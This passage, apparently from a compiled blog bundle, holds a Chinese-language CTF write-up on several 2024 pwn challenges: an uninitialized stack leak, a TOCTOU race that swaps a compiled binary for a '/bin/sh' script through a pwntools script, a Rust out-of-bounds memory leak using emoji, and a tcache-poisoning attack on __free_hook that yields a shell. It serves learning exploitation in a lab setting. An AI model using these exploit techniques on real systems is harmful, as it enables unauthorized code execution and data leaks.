average"}),"\n",(0,i.jsx)(n.p,{children:"\u57fa\u4e8e\u540c\u6808\u8c03\u7528\uff0c\u672a\u521d\u59cb\u5316\u5185\u5b58\u7684\u9898\u3002\u9898\u76ee\u4f1a\u5148\u8c03\u7528\u4e00\u4e2a\u51fd\u6570\u628aflag\u5b58\u50a8\u5230\u6808\u4e0a\uff0c\u7136\u540e\u8c03\u7528\u4e00\u4e2a\u65b0\u7684\u51fd\u6570\uff0c\u5efa\u7acb\u4e00\u4e2aint\u6570\u7ec4\uff0c\u7528scanf\u628a\u8f93\u5165\u8bfb\u53d6\u5230\u5185\u5b58\u4e0a\uff0c\u7136\u540e\u8fd4\u56de\u8f93\u5165\u4e4b\u548c\u7684\u5e73\u5747\u503c\u3002"}),"\n",(0,i.jsx)(n.p,{children:"\u95ee\u9898\u5728\u4e8escanf\u89e3\u6790\u4e0d\u51fa\u6570\u5b57\u65f6\u4f1a\u76f4\u63a5\u8fd4\u56de\uff0c\u6240\u4ee5\u6211\u4eec\u53ea\u8981\u8f93\u5165\u4e00\u4e2a\u975e\u6570\u5b57\uff0c\u5c31\u80fd\u8ba9\u540e\u7eed\u6240\u6709scanf\u5931\u8d25\uff0c\u90a3\u4e48\u6b64\u65f6\u88ab\u7528\u4e8e\u8ba1\u7b97\u5e73\u5747\u503c\u7684\u5185\u5b58\u503c\u5c31\u662f\u672a\u521d\u59cb\u5316\u7684\uff08\u4e5f\u5c31\u662f\u4e0a\u4e00\u6b21\u540c\u6808\u8c03\u7528\u7684flag\u5185\u5bb9\uff09\u3002\u591a\u6b21\u53cd\u590d\u8c03\u7528\u53ef\u4ee5\u83b7\u5f97flag\u5185\u5bb9\u3002"}),"\n",(0,i.jsx)(n.h3,{id:"pwn---races",children:"pwn - races"}),"\n",(0,i.jsxs)(n.p,{children:["\u6709\u70b9\u610f\u601d\u7684\u4e00\u4e2a\u9898\uff0c\u4ece\u9898\u76ee\u540d\u5b57\u6765\u770b\u5c31\u662f\u8003\u6761\u4ef6\u7ade\u4e89\u3002\u9996\u5148\u9898\u76ee\u6240\u6709\u7684\u8f93\u51fa\u90fd\u662f\u5355\u4e2a\u5b57\u7b26\u5e76\u4e14\u95f4\u96940.1\u79d2\uff08\u589e\u5927\u65f6\u95f4\u7a97\u53e3\uff09\uff0c\u8fd9\u4e2a\u9898\u4f1a\u63a5\u53d7\u4e00\u4e2a\u6587\u4ef6\u540d\uff08\u5fc5\u987b\u53ea\u5305\u542b\u5c0f\u5199\u5b57\u6bcd\u548c\u70b9\uff09\uff0cc\u8bed\u8a00\u6e90\u7801\u3002\u7a0b\u5e8f\u4f1a\u628a\u6e90\u7801\u4fdd\u5b58\u5230\u6307\u5b9a\u6587\u4ef6\u4e2d\uff0c\u9996\u5148\u6821\u9a8csha1\u662f\u5426\u662f\u5df2\u77e5\u503c\uff08\u53ea\u6709\u4e24\u4e2a\u5141\u8bb8\u7684\u5df2\u77e5\u503c\uff09\uff0c\u7136\u540e\u7528gcc\u7f16\u8bd1\uff08\u7f16\u8bd1\u76ee\u6807\u6587\u4ef6\u540d\u4e3a\u6e90\u7801\u540d.exe\uff09\uff0c\u4e4b\u540e",(0,i.jsx)(n.code,{children:"subprocess.check_call"}),"\u8fd0\u884c\u3002"]}),"\n",(0,i.jsx)(n.p,{children:"\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u5728\u6821\u9a8c\u597d\u7684\u6587\u4ef6\u7f16\u8bd1\u540e\u5230\u53ef\u6267\u884c\u6587\u4ef6\u6267\u884c\u524d\uff0c\u4e0a\u4f20\u4e00\u4e2a\u65b0\u7684\u6587\u4ef6\u8986\u76d6\u7f16\u8bd1\u540e\u7684\u53ef\u6267\u884c\u7a0b\u5e8f\uff0c\u90a3\u4e48\u5c31\u4f1a\u8fbe\u5230\u5077\u6881\u6362\u67f1\u7684\u6548\u679c\uff0c\u5373TOCTOU\u653b\u51fb\u3002\u4e0a\u4f20\u7684\u65b0\u6587\u4ef6\u5373\u4f7f\u53ea\u662f\u4e00\u4e2ashell\u4e5f\u6ca1\u6709\u5173\u7cfb\uff1a"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-sh",children:"#!/bin/sh\necho getshell\nexec /bin/sh\n"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-py",children:"conn1 = remote('0.cloud.chals.io', 10840)\nconn2 = remote('0.cloud.chals.io', 10840)\nconn1.sendlineafter(b'Enter filename: ', f\"{fname}.c\".encode())\nconn2.sendlineafter(b'Enter filename: ', f\"{fname}.c.exe\".encode())\nconn1.sendlineafter(b'Enter contents (base64): ', allow_b64)\n\nconn1.recvuntil(b'Runn')\n\nconn2.sendlineafter(b'Enter contents (base64): ', getshell_b64)\n\n# conn1.sendline(b'ls /; cat flag')\nconn1.interactive()\n# TBTL{T1m3_0f_chEck_70_tIM3_0f_PWN}\n"})}),"\n",(0,i.jsx)(n.h3,{id:"pwn---diamonds-and-rust",children:"pwn - diamonds and rust"}),"\n",(0,i.jsx)(n.p,{children:"\u8fd9\u4e2a\u9898\u662f\u4e00\u4e2arust\uff0c\u7ed9\u4e86\u6e90\u7801\uff0c\u867d\u7136\u6ca1\u6709\u5b8c\u5168\u7406\u89e3\u3002"}),"\n",(0,i.jsx)(n.p,{children:"\u5176\u5b9e\u662f\u4e00\u4e2a\u767b\u5f55\u754c\u9762\u3002\u9996\u5148\u6211\u4eec\u53ef\u4ee5\u8f93\u5165\u4e00\u4e2a\u7528\u6237\u540d\uff0c\u7136\u540e\u7a0b\u5e8f\u4f1a\u56de\u663e\u7528\u6237\u540d\uff0c\u8981\u6c42\u6211\u4eec\u8f93\u5165\u5bc6\u7801\u3002\u4e4b\u540e\u628a\u5bc6\u7801\u548c\u67d0\u4e2a\u5e38\u91cf\u6bd4\u5bf9\uff0c\u5982\u679c\u76f8\u7b49\u4f1a\u7ed9\u6211\u4eecflag\u3002"}),"\n",(0,i.jsx)(n.p,{children:"\u8fd9\u4e2a\u9898\u6e90\u7801\u6709\u4e24\u5904unsafe\u4ee3\u7801\uff0c\u51fa\u73b0\u5728\u8bbe\u7f6e\u5b57\u6bb5\uff08\u7528\u6237\u540d\u548c\u5bc6\u7801\uff09\u4e0e\u6253\u5370\u7528\u6237\u540d\u65f6\u3002"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-rust",children:'\nmacro_rules! set_field {\n    ($self:expr, $value:expr, $max_len:expr, $field_size:ident, $field:ident) => {\n        $self.$field_size = $value.len();\n        let value_chars = $value.chars().collect::<Vec<_>>();\n        if value_chars.len() > $max_len {\n            panic!("Value must not exceed {} characters!", $max_len);\n        }\n\n        unsafe {\n            std::ptr::copy_nonoverlapping(\n                $value.as_bytes().as_ptr(),\n                $self.$field.as_mut_ptr(),\n                value_chars.len(),\n            );\n        }\n    };\n}\n\nfn set_username(&mut self, username: &str) {\n    set_field!(self, username, MAX_USERNAME_LENGTH, username_size, username);\n}\nfn print_username(&self) -> () {\n    for i in 0..self.username_size {\n        unsafe {\n            let current_byte = *self.username.get_unchecked(i);\n            std::io::stdout()\n                .write_all(&[current_byte])\n                .expect("Error while printing the username");\n        }\n    }\n}\n'})}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.code,{children:"get_unchecked"}),"\u548c",(0,i.jsx)(n.code,{children:"copy_nonoverlapping"}),"\u7684\u6587\u6863\u63d0\u793a\u4e86\u8fd9\u4e2a\u9898\u53ef\u80fd\u7684\u601d\u8def\uff1a"]}),"\n",(0,i.jsxs)(n.blockquote,{children:["\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"get_unchecked: Safety: Calling this method with an out-of-bounds index is undefined behavior even if the resulting reference is not used."}),"\n",(0,i.jsx)(n.li,{children:"copy_nonoverlapping: The copy is \u201cuntyped\u201d in the sense that data may be uninitialized or otherwise violate the requirements of T. The initialization state is preserved exactly."}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.p,{children:["\u56e0\u6b64\u53ef\u80fd\u9700\u8981\u4e00\u4e2a\u6570\u7ec4\u8d8a\u754c\u3002\u53e6\u5916\uff0crust\u4e2d\u5b57\u7b26\u4e32",(0,i.jsx)(n.code,{children:".len()"}),"\u4f3c\u4e4e\u8fd4\u56de\u7684\u662f\u5b57\u8282\u6570\uff0c\u4f46",(0,i.jsx)(n.code,{children:"get_unchecked"}),"\u8fd4\u56de\u7684\u662f\u5b57\u7b26\u6570\uff0c\u56e0\u6b64\u5f53\u8f93\u5165\u591a\u5b57\u8282\u5b57\u7b26\u65f6\uff0c\u4f1a\u53d1\u751f\u6570\u7ec4\u8d8a\u754c\uff0c\u628a\u540e\u9762\u7684\u5185\u5bb9\u6253\u5370\u51fa\u6765\u3002\n\u4e3a\u4e86\u83b7\u53d6\u6700\u591a\u7684\u6570\u7ec4\u8d8a\u754c\uff0c\u6211\u4eec\u5e0c\u671b\u8f93\u5165emoji\uff084\u4e2a\u5b57\u8282\uff09\uff0c\u8fd9\u6837\u5728\u7528\u6237\u540d\u56de\u663e\u65f6\u4f1a\u6253\u5370\u51fa\u540e\u9762\u4e09\u500d\u957f\u5ea6\u7684\u5185\u5b58\uff08\u6211\u4eec\u53d6\u7a0b\u5e8f\u5141\u8bb8\u7684\u6700\u957f\u7528\u6237\u540d\uff1a",(0,i.jsx)(n.code,{children:"'\ud83d\ude05'*32"}),"\uff0c\u80fd\u591a\u8fd4\u56de96\u5b57\u8282\uff09\u3002\n\u672c\u5730\u6d4b\u8bd5\u53d1\u73b0\uff0c\u5bc6\u7801\u5176\u5b9e\u5c31\u5728\u540e\u9762\u7684\u5185\u5b58\u91cc\uff0c\u5e76\u4e14\u4f1a\u91cd\u590d\u4e24\u904d\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u53ea\u9700\u8981\u627e\u5230\u8fdc\u7aef\u91cd\u590d\u7684\u5185\u5b58\u5373\u53ef\u3002"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-log",children:"[DEBUG] Received 0x99 bytes:\n00000000  48 65 6c 6c  6f 2c 20 f0  9f 98 85 f0  9f 98 85 f0  \u2502Hell\u2502o, \xb7\u2502\xb7\xb7\xb7\xb7\u2502\xb7\xb7\xb7\xb7\u2502\n00000010  9f 98 85 f0  9f 98 85 f0  9f 98 85 f0  9f 98 85 f0  \u2502\xb7\xb7\xb7\xb7\u2502\xb7\xb7\xb7\xb7\u2502\xb7\xb7\xb7\xb7\u2502\xb7\xb7\xb7\xb7\u2502\n00000020  9f 98 85 f0  9f 98 85 00  00 00 00 00  00 00 00 00  \u2502\xb7\xb7\xb7\xb7\u2502\xb7\xb7\xb7\xb7\u2502\xb7\xb7\xb7\xb7\u2502\xb7\xb7\xb7\xb7\u2502\n00000030  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  \u2502\xb7\xb7\xb7\xb7\u2502\xb7\xb7\xb7\xb7\u2502\xb7\xb7\xb7\xb7\u2502\xb7\xb7\xb7\xb7\u2502\n00000040  00 00 00 00  00 00 00 10  59 bd 21 c8  55 00 38 38  \u2502\xb7\xb7\xb7\xb7\u2502\xb7\xb7\xb7\xb7\u2502Y\xb7!\xb7\u2502U\xb788\u2502\n00000050  66 35 64 37  64 36 36 35  30 64 62 65  31 39 35 61  \u2502f5d7\u2502d665\u25020dbe\u2502195a\u2502\n00000060  62 31 39 61  39 38 65 65  38 31 66 31  35 32 38 38  \u2502b19a\u250298ee\u250281f1\u25025288\u2502\n00000070  66 35 64 37  64 36 36 35  30 64 62 65  31 39 35 61  \u2502f5d7\u2502d665\u25020dbe\u2502195a\u2502\n00000080  62 31 39 61  39 38 65 21  0a 45 6e 74  65 72 20 70  \u2502b19a\u250298e!\u2502\xb7Ent\u2502er p\u2502\n00000090  61 73 73 77  6f 72 64 3a  20                        \u2502assw\u2502ord:\u2502 \u2502\n[DEBUG] Sent 0x21 bytes:\nb'88f5d7d6650dbe195ab19a98ee81f152\\n'\n[*] Switching to interactive mode\nHere is your flag: \nTBTL{TnX_F0r_0ff3r1n6_M3_S3cr3t5_1n_Ru57}\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u8fd8\u597d\u4e0d\u662fsafe rust\uff0c\u5426\u4fbf\u6837\u8870\u4e86"}),"\n",(0,i.jsx)(n.h3,{id:"pwn---heap-peek-and-poke",children:"pwn - heap peek and poke"}),"\n",(0,i.jsx)(n.p,{children:"libc 2.27 (Ubuntu 18.04) \u5806\u9898\uff0c\u4fdd\u62a4\u5168\u5f00\uff0c\u7ed9\u6e90\u7801\n\u6e90\u7801\u5176\u5b9e\u5f88\u7b80\u5355\uff0c\u662f\u4e00\u4e2aC++\u7684\uff0c\u53ef\u4ee5\u65e0\u9650\u6b21\u8bfb\u53d6/\u5199\u5165\u5355\u4e2a\u5b57\u7b26\uff0c\u6709\u4e00\u4e2aint\u7684\u5927\u5c0f\u8303\u56f4\u7684\u6570\u7ec4\u8d8a\u754c\u3002"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-cpp",children:'void win() {\n  ifstream in("flag.txt");\n  string flag;\n  in >> flag;\n  cout << flag << endl;\n}\n\nint main() {\n  cout.setf(ios::unitbuf);\n  cout << ENTER_PROMPT << endl;\n  string s;\n  getline(cin, s);\n  if (s.size() < 0x20)\n    return 0;\n  while (true) {\n    cout << COMMAND_PROMPT << endl;\n    string line;\n    getline(cin, line);\n    istringstream iss(line);\n    string command;\n    iss >> command;\n    if (command == POKE_CMD) {\n      int x, y;\n      if (!(iss >> x >> y)) {\n        cout << HELP.at(POKE_CMD) << endl;\n        continue ;\n      }\n      s[x] = char(y);\n    } else if (command == PEEK_CMD) {\n      int x;\n      if (!(iss >> x)) {\n        cout << HELP.at(PEEK_CMD) << endl;\n        continue ;\n      }\n      cout << int(s[x]) << endl;\n    } else if (command == QUIT_CMD) {\n      cout << BYE_MSG << endl;\n      break ;\n    } else {\n      cout << UNKNOWN_CMD << endl;\n      continue ;\n    }\n  }\n  return 0;\n}\n'})}),"\n",(0,i.jsx)(n.p,{children:"\u4e0d\u8fc7\u6709\u4e9b\u4e1c\u897f\u5728\u6e90\u7801\u91cc\u53ef\u80fd\u76f4\u63a5\u4f53\u73b0\u4e0d\u51fa\u6765\uff1awhile\u5faa\u73af\u5185\u58f0\u660e\u7684\u4e09\u4e2astring/istringstream\u5c40\u90e8\u53d8\u91cf\uff0c\u4f1a\u5411\u5806\u7533\u8bf7\u5185\u5b58\uff0c\u5e76\u5728\u8fdb\u5165\u4e0b\u4e00\u6b21\u5faa\u73af\u524d\u91ca\u653e\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u8fd9\u4e2a\u5faa\u73af\u9690\u542b\u4e86\u4e09\u6b21malloc\u8fc7\u7a0b\u548c\u4e09\u6b21free\u8fc7\u7a0b\u3002malloc\u7684\u5927\u5c0f\u4e00\u5b9a\u7a0b\u5ea6\u53ef\u63a7\uff08\u548c\u8f93\u5165\u7684command\u957f\u5ea6\u6709\u5173\uff0c\u4f46\u4f1a\u7a0d\u5fae\u957f\u4e00\u70b9\uff09"}),"\n",(0,i.jsx)(n.p,{children:"\u7ecf\u8fc7\u8c03\u8bd5\u53ef\u4ee5\u53d1\u73b0\uff0c\u5f53\u8fdb\u5165\u8fd9\u4e2a\u5faa\u73af\u65f6\uff0c\u5806\u4e0a\u5df2\u7ecf\u7533\u8bf7\u4e86\u4e00\u5927\u5806\u5806\u5757\u4e86\uff0ctcache\u4e5f\u88c5\u4e86\u4e00\u4e9b\uff0c\u56e0\u800c\u53ef\u4ee5\u4ecetcache\u6cc4\u9732\u5806\u5730\u5740\u3002\u5e76\u4e14\u4ece\u8fd9\u4e9b\u5806\u5757\u80fd\u627e\u5230\u4e00\u4e2a\u6307\u5411rodata\u6bb5\u7684\u5730\u5740\uff0c\u901a\u8fc7\u8fd9\u4e2a\u6211\u4eec\u53ef\u4ee5\u6cc4\u6f0f\u4ee3\u7801\u6bb5\u5730\u5740\uff0c\u800c\u901a\u8fc7GOT\u8868\u6211\u4eec\u53ef\u4ee5\u62ff\u5230LIBC\u5730\u5740\uff08\u6ce8\u610f\u53ea\u662f\u62ff\u5230\u5730\u5740\uff0cint\u957f\u5ea6\u7684\u6ea2\u51fa\u65e0\u6cd5\u8ba9\u6211\u4eec\u6539mmap\u5730\u5740\u6bb5\uff09"}),"\n",(0,i.jsxs)(n.p,{children:["\u63a5\u4e0b\u6765\u7684\u601d\u8def\u6211\u6253\u7b97\u7528tcache poisoning\u6253",(0,i.jsx)(n.code,{children:"__free_hook"}),"\u3002\u6211\u53d1\u73b0\u5f53\u8f93\u5165\u5b57\u7b26\u4e32\u4e3a",(0,i.jsx)(n.code,{children:"0x18"}),"\u957f\u5ea6\u4e14\u4e0d\u5305\u542b\u7a7a\u683c\uff08\u7a7a\u683c\u662f",(0,i.jsx)(n.code,{children:"istringstream >>"}),"\u7684\u5206\u9694\u7b26\uff09\u65f6\uff0c\u4e09\u4e2a\u5c40\u90e8\u53d8\u91cf\u7533\u8bf7\u7684\u5806\u5757\u4e3a",(0,i.jsx)(n.code,{children:"0x30"}),"\uff0c\u56e0\u6b64\u6211\u53ea\u8981\u628a\u7b2c\u4e8c\u4e2a\u5806\u5757\u7684",(0,i.jsx)(n.code,{children:"fd"}),"\u6539\u6210",(0,i.jsx)(n.code,{children:"&__free_hook - 0x10"}),"\uff0c\u518d\u8f93\u5165\u4e00\u4e2a",(0,i.jsx)(n.code,{children:"0x18"}),"\u5b57\u7b26\u4e32\u65f6\uff0c\u4f1a\u8986\u76d6\u5230",(0,i.jsx)(n.code,{children:"__free_hook"}),"\uff0c\u5728\u5faa\u73af\u7ed3\u675f\u91ca\u653e\u65f6\uff0c\u4f1a\u8c03\u7528",(0,i.jsx)(n.code,{children:"hook(chunk_addr)"}),"\uff08chunk\u4ecd\u7136\u662f\u6211\u4eec\u8fd9\u6b21\u7684\u8f93\u5165\uff09\uff0c\u5982\u679c\u8fd9\u6b21\u7684\u8f93\u5165\u662f",(0,i.jsx)(n.code,{children:'"/bin/sh;/bin/sh;" + p64(system_addr + 0x5)'}),"\uff0c\u90a3\u4e48\u5c31\u4f1a\u8c03\u7528hook\u51fd\u6570",(0,i.jsx)(n.code,{children:'(system + 5)("/bin/sh;...")'}),"\u3002"]}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"\u4e3a\u4ec0\u4e48\u662f\u7b2c\u4e8c\u4e2a\u5806\u5757\uff1f\u56e0\u4e3atcache poisoning\u8981\u6c42\u7684\u662f\u94fe\u8868\u5c3e\u7684\u5012\u6570\u7b2c\u4e8c\u4e2a\u5806\u5757\uff0c\u8fd9\u6837\u521a\u597d\u5206\u914d\u5230\u76ee\u6807\u4f4d\u7f6e\u540e\u5c31\u4e0d\u518d\u6709\u591a\u4f59\u7684malloc\u8fc7\u7a0b\u4e86\uff08\u5426\u5219\u4e00\u5b9a\u4f1a\u62a5\u9519\uff09"}),"\n",(0,i.jsxs)(n.li,{children:["\u4e3a\u4ec0\u4e48\u662f",(0,i.jsx)(n.code,{children:"system + 5"}),"\uff1f\u56e0\u4e3a\u8fd9\u4e2a\u7248\u672c",(0,i.jsx)(n.code,{children:"libc"}),"\u7684system\u5730\u5740\u504f\u79fb\u521a\u597d\u662f",(0,i.jsx)(n.code,{children:"0x420"}),"\uff0c\u800c",(0,i.jsx)(n.code,{children:"0x20"}),"\u662f\u7a7a\u683c\uff0c\u4f1a\u88ab",(0,i.jsx)(n.code,{children:"istringstream"}),"\u622a\u65ad\uff0c\u65e0\u6cd5\u5199\u5230freehook\u91cc\u3002\u8fd9\u4e2a5\u662f\u8df3\u8fc7\u4e86system\u5f00\u5934\u4e00\u4e2a\u4e0d\u91cd\u8981\u7684\u5206\u652f\u6307\u4ee4\u3002"]}),"\n",(0,i.jsxs)(n.li,{children:["\u4e3a\u4ec0\u4e48\u4e0d\u7528",(0,i.jsx)(n.code,{children:"win"}),"\u51fd\u6570\uff1f\u597d\u95ee\u9898\uff0c\u56e0\u4e3a\u6253\u7684\u65f6\u5019\u592a\u4e0a\u5934\u6211\u5fd8\u4e86\uff08\u80fdgetshell\u4e3a\u4ec0\u4e48\u8fd8\u8981\u7528win\u51fd\u6570\uff1f\uff09"]}),"\n",(0,i.jsxs)(n.li,{children:["\u6253",(0,i.jsx)(n.code,{children:"__malloc_hook"}),"\u884c\u4e0d\u884c\uff1f\u4e09\u6b21free\u7684\u8fc7\u7a0b\u4f1a\u63d0\u793ainvalid pointer\uff08\u5e94\u8be5\u662f\u4fee\u6539\u540etcache\u7b2c\u4e09\u4e2a\u5757\u7684fd\u975e\u7a7a\u5bfc\u81f4\u7684\uff09"]}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:"\u53e6\u5916\u8bf4\u4e00\u4e2a\u5f88\u6709\u8da3\u7684\u601d\u8def\uff0c\u8fd9\u4e2a\u9898\u5f53\u521d\u59cb\u8f93\u5165\u5b57\u7b26\u4e32\u8d85\u8fc7128KB\u65f6\uff0c\u4f1a\u88abmmap\u5206\u914d\u5185\u5b58\uff0c\u5e76\u4e14\u5f53\u8db3\u591f\u5927\u65f6\uff08MB\u7ea7\u522b\uff0c\u4e3b\u8981\u662f\u4e3a\u4e86ld, libm\uff0clibstdc++\u8fd9\u4e9b\u7684\u5806\u7a7a\u95f4\u88c5\u4e0d\u4e0b\uff09\u4f1a\u5206\u914d\u5230\u548clibc\u56fa\u5b9a\u504f\u79fb\u7684\u5185\u5b58\u4e0a\uff0c\u7406\u8bba\u4e0a\u53ef\u4ee5\u76f4\u63a5\u6539hook / IO_vtable\u3002\u53ea\u53ef\u60dc\u4e00\u4e2a\u5b57\u8282\u4e00\u4e2a\u5b57\u8282\u6539\u52a8\u5e94\u8be5\u4f1a\u5bfc\u81f4malloc/free\u4e2d\u9014\u62a5\u9519\uff0c\u6240\u4ee5\u8fd8\u662f\u76f4\u63a5\u5728tcache\u4e0a\u505a\u4f1a\u7b80\u5355\u4e00\u70b9\u3002\u4e0d\u77e5\u9053\u6709\u6ca1\u6709\u4eba\u57fa\u4e8e\u8fd9\u4e2a\u601d\u8def\u6253\u901a\u3002"})]})}function h(e={}){const{wrapper:n}={...(0,l.R)(),...e.components};return n?(0,i.jsx)(n,{...e,children:(0,i.jsx)(o,{...e})}):o(e)}},4860:(e,n,s)=>{s.d(n,{A:()=>r});const r=s.p+"assets/images/freedns-15f32c035f4f5ce24b4896701781bcb5.png"},4274:(e,n,s)=>{s.d(n,{A:()=>r});const r=s.p+"assets/images/redirhub-695e2ebf699f4e6aa5be7bddbcf5c7b6.png"},8453:(e,n,s)=>{s.d(n,{R:()=>t,x:()=>c});var r=s(6540);const i={},l=r.createContext(i);function t(e){const n=r.useContext(l);return r.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function c(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:t(e.components),r.createElement(l.Provider,{value:n},e.children)}},8758:e=>{e.exports=JSON.parse('{"permalink":"/ctf-writeup/2024/05/13/TBTLCTF2024","source":"@site/ctf/2024-05-13-TBTLCTF2024/index.md","title":"squ1rrelCTF2024 + TBTL CTF 2024 (Web + Pwn)","description":"\u90fd\u662f\u504f\u5165\u95e8\u5411\uff0c\u4e0d\u662f\u4e13\u4e1aCTF\uff0c\u6709\u4e9b\u9898\u6bd4\u8f83\u731c/\u85cf\uff0c\u4e0d\u8fc7\u786e\u5b9e\u6709\u4e00\u4e9b\u9898\u76ee\u6bd4\u8f83\u6709\u8da3","date":"2024-05-13T00:00:00.000Z","tags":[{"inline":false,"label":"CTF","permalink":"/ctf-writeup/tags/ctf","description":"Catch-The-Flag contests writeups / learning notes"}],"readingTime":20.79,"hasTruncateMarker":true,"authors":[{"name":"Lysithea","title":"CTF enthusiastist. Usual teamname: Lysithea, Ribom, RibomBalt","email":"ribombalt1@gmail.com","page":{"permalink":"/ctf-writeup/authors/RibomBalt"},"socials":{"github":"https://github.com/RibomBalt","stackoverflow":"https://stackoverflow.com/users/RibomBalt","ctftimes":"https://ctftime.org/team/282941"},"imageURL":"https://github.com/RibomBalt.png","key":"RibomBalt"}],"frontMatter":{"title":"squ1rrelCTF2024 + TBTL CTF 2024 (Web + Pwn)","authors":"RibomBalt","tags":["CTF"]},"unlisted":false,"prevItem":{"title":"TJCTF 2024 / NahamConCTF 2024 / \xe5ngstrom CTF 2024","permalink":"/ctf-writeup/2024/05/29/angstormCTF2024"},"nextItem":{"title":"GeekCTF 2024 (+2 small CTFs)","permalink":"/ctf-writeup/2024/04/14/geekctf-writeup"}}')}}]);